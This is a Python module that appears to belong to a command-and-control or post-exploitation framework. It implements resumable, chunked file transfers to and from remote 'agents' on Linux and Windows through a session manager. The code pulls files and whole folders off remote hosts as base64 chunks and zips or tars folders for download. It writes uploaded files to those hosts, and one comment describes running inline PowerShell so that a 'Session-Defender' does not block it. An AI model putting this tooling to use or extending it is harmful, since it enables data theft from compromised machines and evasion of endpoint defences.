import logging
logger = logging.getLogger(__name__)

import base64, os, time, re, ntpath
from typing import Optional
from .base import TransferProtocol
from ..state import TransferState
from ..chunker import chunk_count, index_to_offset, ensure_prealloc, write_at
from core.session_handlers import session_manager
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution  as tcp_exec

from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
reset = Style.RESET_ALL

def _run_cmd(sid: str, cmd: str, transport: str, op_id: Optional[str]) -> str:
	"""
	Route command to the correct execution path and return stdout as string (normalized).
	"""
	tr = transport.lower()
	if tr in ("http","https"):
		return http_exec.run_command_http(sid, cmd, op_id=op_id) or ""
	else:
		# tcp/tls
		return tcp_exec.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True, op_id=op_id) or ""

def _b64_to_bytes(s: str) -> bytes:
	# strip whitespace/newlines safely
	s = "".join(s.split())
	if not s:
		return b""
	return base64.b64decode(s.encode(), validate=False)

def _ps_quote(s: str) -> str:
	return "'" + str(s).replace("'", "''") + "'"

def _linux_shq(s: str) -> str:
	return "'" + str(s).replace("'", "'\"'\"'") + "'"

def _parse_int(s: str, default: int = 0) -> int:
	try:
		return int(str(s).strip())
	except Exception:
		return default

class ShellProtocol(TransferProtocol):
	"""
	Fully compatible with your current agents:
	- Linux: dd + base64 for downloads; printf+base64 -d for uploads
	- Windows: PowerShell FileStream for both directions
	Supports: resumable, chunked transfers; folder via remote archive (zip/tar.gz)
	"""
	def __init__(self, op_id: Optional[str] = None):
		self.op_id = op_id

	# ---------- helpers ----------
	def _remote_size(self, st: TransferState) -> int:
		"""
		Return file size in bytes, or -1 if missing/unreachable.
		Use simple, newline-terminated integer output to avoid fragile parsing.
		"""
		if st.os_type == "linux":
			sh = (
				"bash -lc "
				f"\"if [ -f { _linux_shq(st.remote_path) } ]; then stat -c %s { _linux_shq(st.remote_path) }; "
				"else echo -1; fi\""
			)
			out = (_run_cmd(st.sid, sh, st.transport, self.op_id) or "").strip()
			try:
				return int(out)
			except Exception:
				return -1
		else:
			# Windows: plain integer, -1 if missing
			ps = (
				"[Console]::OutputEncoding=[System.Text.Encoding]::ASCII; "
				f"$p={_ps_quote(st.remote_path)}; "
				"$i=Get-Item -LiteralPath $p -ErrorAction SilentlyContinue; "
				"if ($null -eq $i) { '-1' } else { $i.Length }"
			)
			out = (_run_cmd(st.sid, ps, st.transport, self.op_id) or "").strip()
			try:
				return int(out)
			except Exception:
				return -1

	def _linux_read_chunk(self, st: TransferState, index: int) -> bytes:
		# dd avoids partial lines and is faster than tail/head for big files
		bs = st.chunk_size
		cmd = f"dd if={_linux_shq(st.remote_path)} bs={bs} skip={index} count=1 status=none | base64"
		out = _run_cmd(st.sid, cmd, st.transport, self.op_id)
		if not out.strip():
			logger.exception(brightred + "No output from agent for linux chunk read!" + reset)
			raise ConnectionError("no output from agent for linux chunk read")
		return _b64_to_bytes(out)

	def _windows_read_chunk(self, st: TransferState, index: int) -> bytes:
		offset = index * st.chunk_size
		n      = st.chunk_size
		ps = (
			f"$fs=[System.IO.File]::OpenRead({_ps_quote(st.remote_path)});"
			f"$fs.Seek({offset},'Begin') > $null;"
			f"$buf=New-Object byte[] {n};"
			f"$read=$fs.Read($buf,0,{n});"
			"$fs.Close();"
			"[Convert]::ToBase64String($buf,0,$read)"
		)
		out = _run_cmd(st.sid, ps, st.transport, self.op_id)
		if not out.strip():
			raise ConnectionError("no output from agent for windows chunk read")
		return _b64_to_bytes(out)

	def _linux_write_chunk(self, st: TransferState, offset: int, chunk_b64: str) -> None:
		"""
		Idempotent write at absolute offset using dd (no append). Truncation is not performed here.
		"""
		# bash -lc for strict error propagation; dd writes exactly at byte offset
		cmd = (
			"bash -lc "
			f"\"set -euo pipefail; "
			f"printf '%s' '{chunk_b64}' | base64 -d | "
			f"dd of={_linux_shq(st.remote_path)} bs=1M seek={offset} conv=notrunc status=none\""
		)
		out = _run_cmd(st.sid, cmd, st.transport, self.op_id)

	def _windows_write_chunk(self, st: TransferState, offset: int, chunk_b64: str) -> None:
		"""
		Append one base64-encoded chunk to the remote file using **inline PowerShell**,
		avoiding a new 'powershell.exe' process so Session-Defender does not block it.
		"""
		# Defensively escape any single quotes in the payload/path for PS single-quoted literals.
		# (Base64 normally has no single quotes, but this is future-proof and safe.)
		safe_chunk = chunk_b64.replace("'", "''")
		safe_path  = st.remote_path.replace("'", "''")

		ps = (
			"[Console]::OutputEncoding=[System.Text.Encoding]::ASCII; "
			f"$bytes=[Convert]::FromBase64String('{safe_chunk}'); "
			f"$s=[System.IO.File]::Open('{safe_path}','OpenOrCreate','ReadWrite','None'); "
			f"$null=$s.Seek({offset}, [System.IO.SeekOrigin]::Begin); "
			"$s.Write($bytes,0,$bytes.Length); "
			"$s.Close()"
		)
		# IMPORTANT: send the snippet directly; do NOT wrap with 'powershell -Command ...'
		_run_cmd(st.sid, ps, st.transport, self.op_id)

	def _prepare_remote_archive(self, st: TransferState) -> None:
		"""
		If is_folder, create an archive remotely and switch st.remote_path to that archive (resumable by bytes).
		"""
		if not st.is_folder:
			return

		opt = getattr(st, "options", {}) or {}
		# If we've already prepared an archive once and st.remote_path already points to it, skip.
		if opt.get("archive_prepared") and opt.get("archive_path"):
			# Best-effort: verify it still exists; otherwise we'll rebuild once.
			try:
				if st.os_type == "windows":
					ps = f"(Test-Path -LiteralPath {_ps_quote(opt['archive_path'])})"
					exists = (_run_cmd(st.sid, ps, st.transport, self.op_id) or "").strip().lower() == "true"

				else:
					sh = f"bash -lc 'test -f {_linux_shq(opt['archive_path'])} && echo OK || echo NO'"
					exists = "OK" in (_run_cmd(st.sid, sh, st.transport, self.op_id) or "")

				if exists:
					st.remote_path = opt["archive_path"]
					return

			except Exception:
				pass

		# Derive names using OS-appropriate semantics.
		if st.os_type == "windows":
			base = ntpath.basename(st.remote_path.rstrip("/\\"))
			parent = ntpath.dirname(st.remote_path.rstrip("/\\"))
		else:
			base = os.path.basename(st.remote_path.rstrip("/\\"))
			parent = os.path.dirname(st.remote_path.rstrip("/\\"))

		if st.os_type == "windows":
			# Build ...\repos.zip next to the folder, never inside it.
			remote_zip = ntpath.join(parent, base + ".zip")
			# Remove any existing archive; CreateFromDirectory will fail if it exists.
			rm = f"if (Test-Path {_ps_quote(remote_zip)}) {{ Remove-Item {_ps_quote(remote_zip)} -Force }}"
			_run_cmd(st.sid, rm, st.transport, self.op_id)
			zip_cmd = (
				"[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null; "
				f"[IO.Compression.ZipFile]::CreateFromDirectory({_ps_quote(st.remote_path)},{_ps_quote(remote_zip)},"
				"[IO.Compression.CompressionLevel]::Optimal,$false)"
			)
			out = _run_cmd(st.sid, zip_cmd, st.transport, self.op_id)
			# Optional: poll until size > EOCD (22 bytes) to avoid empty placeholder issues.
			size_ps = (
				f"if (Test-Path {_ps_quote(remote_zip)}) {{ (Get-Item {_ps_quote(remote_zip)}).Length }} else {{ 0 }}"
			)
			for _ in range(30):
				sz = (_run_cmd(st.sid, size_ps, st.transport, self.op_id) or "").strip()
				try:
					if int(sz) > 22:  # larger than empty ZIP EOCD
						break
				except Exception:
					pass
				time.sleep(0.2)
			st.archive_remote_path = remote_zip
			st.cleanup_remote_cmd  = f"Remove-Item {_ps_quote(remote_zip)} -Force"
			st.remote_path         = remote_zip
			# Save fingerprint + mark prepared
			mtime_ps = f"(Get-Item {_ps_quote(remote_zip)}).LastWriteTimeUtc.Ticks"
			mtime = _parse_int(_run_cmd(st.sid, mtime_ps, st.transport, self.op_id))
			length = _parse_int(_run_cmd(st.sid, size_ps,   st.transport, self.op_id))
			opt["archive_prepared"] = True
			opt["archive_path"] = remote_zip
			opt["archive_ext"] = ".zip"
			opt["archive_fp"] = {"size": length, "mtime": mtime}
			st.options = opt

		else:
			remote_tar = f"/tmp/{base}.tar.gz"
			_run_cmd(st.sid, f"rm -f {_linux_shq(remote_tar)}", st.transport, self.op_id)
			tar_cmd = f"tar czf {_linux_shq(remote_tar)} -C {_linux_shq(st.remote_path)} ."
			_run_cmd(st.sid, tar_cmd, st.transport, self.op_id)
			st.archive_remote_path = remote_tar
			st.cleanup_remote_cmd  = f"rm -f {_linux_shq(remote_tar)}"
			st.remote_path         = remote_tar
			# Save fingerprint + mark prepared
			size_sh = f"bash -lc 'stat -c %s {_linux_shq(remote_tar)}'"
			mtime_sh = f"bash -lc 'stat -c %Y {_linux_shq(remote_tar)}'"
			length = _parse_int(_run_cmd(st.sid, size_sh,  st.transport, self.op_id))
			mtime  = _parse_int(_run_cmd(st.sid, mtime_sh, st.transport, self.op_id))
			opt["archive_prepared"] = True
			opt["archive_path"] = remote_tar
			opt["archive_ext"] = ".tar.gz"
			opt["archive_fp"] = {"size": length, "mtime": mtime}
			st.options = opt

	# ---------- protocol API ----------
	def init_download(self, st: TransferState) -> TransferState:
		# If folder → build remote archive first.
		self._prepare_remote_archive(st)
		total = self._remote_size(st)
		st.total_bytes  = total
		st.total_chunks = chunk_count(total, st.chunk_size)
		st.status = "running"
		return st

	def next_download_chunk(self, st: TransferState) -> Optional[int]:
		idx = st.next_index
		if idx >= st.total_chunks:
			return None
		offset = index_to_offset(idx, st.chunk_size)
		# Pull the chunk bytes
		data = self._linux_read_chunk(st, idx) if st.os_type == "linux" else self._windows_read_chunk(st, idx)

		# Empty output is never OK for mid-stream chunks.
		if not data:
			if idx < st.total_chunks - 1:
				raise ConnectionError("short read (empty) mid-transfer")
			# Last chunk can be empty only if file size aligned exactly to chunk size.
			# In that rare case, we’re effectively done.
			st.next_index = st.total_chunks
			return None

		# Non-final chunk must be exactly chunk_size bytes
		if idx < st.total_chunks - 1 and len(data) != st.chunk_size:
			raise ConnectionError(f"short read ({len(data)} bytes) at chunk {idx}")

		"""# If we are NOT on the last chunk, we must receive a full chunk.
		# A shorter block here means the command was interrupted; do not write or advance.
		is_last = (idx == st.total_chunks - 1)
		if (not is_last) and (len(data) < st.chunk_size):
			# Propagate a connection-type error so the manager pauses the transfer.
			raise ConnectionError(f"short read at chunk {idx} ({len(data)} < {st.chunk_size})")"""

		# If last chunk is larger than expected for some reason, trim to expected size
		# (defensive; normally Windows/Linux readers won’t exceed the requested size).
		is_last = (idx == st.total_chunks - 1)
		if is_last:
			expected_last = st.total_bytes - index_to_offset(idx, st.chunk_size)
			if len(data) > expected_last:
				data = data[:expected_last]
				
		ensure_prealloc(st.tmp_local_path, st.total_bytes)
		write_at(st.tmp_local_path, offset, data)
		st.bytes_done += len(data)
		st.next_index += 1
		return idx

	def init_upload(self, st: TransferState) -> TransferState:
		# clear or create remote target
		"""if st.os_type == "linux":
			_run_cmd(st.sid, f"rm -f \"{st.remote_path}\"", st.transport, self.op_id)
		else:
			_run_cmd(st.sid, f"&{{ Try {{ Remove-Item -Path \"{st.remote_path}\" -ErrorAction Stop }} Catch {{ }} }}", st.transport, self.op_id)"""
		# For brand-new uploads we will start at offset 0; manager handles resume alignment
		# Do not delete the remote file here — resume logic depends on its size.
		st.status = "running"
		return st

	def next_upload_chunk(self, st: TransferState) -> Optional[int]:
		idx = st.next_index
		if idx >= st.total_chunks:
			return None
		with open(st.local_path, "rb") as f:
			f.seek(index_to_offset(idx, st.chunk_size))
			data = f.read(st.chunk_size)
		if not data:
			st.next_index = st.total_chunks
			return None
		b64 = base64.b64encode(data).decode()
		# Absolute byte offset for this chunk
		offset = index_to_offset(idx, st.chunk_size)
		if st.os_type == "linux":
			self._linux_write_chunk(st, offset, b64)
		else:
			self._windows_write_chunk(st, offset, b64)

		# Verify remote size reached at least offset + len(data)
		try:
			rsz = self._remote_size(st)
			need = min(st.total_bytes, offset + len(data))
			if rsz < need:
				#print(brightred + f"remote short write: {rsz} < {need}" + reset)
				raise ConnectionError(f"remote short write: {rsz} < {need}")
				logger.exception(brightred + f"remote short write: {rsz} < {need}" + reset)
		except Exception as e:
			# Surface as a connection error so manager doesn't advance index
			logger.exception(brightred + f"Exception in next upload chunk function {str(e)}")

		st.bytes_done += len(data)
		st.next_index += 1
		return idx

	def cleanup(self, st: TransferState) -> None:
		if st.cleanup_remote_cmd:
			try:
				_run_cmd(st.sid, st.cleanup_remote_cmd, st.transport, self.op_id)
			except Exception:
				pass
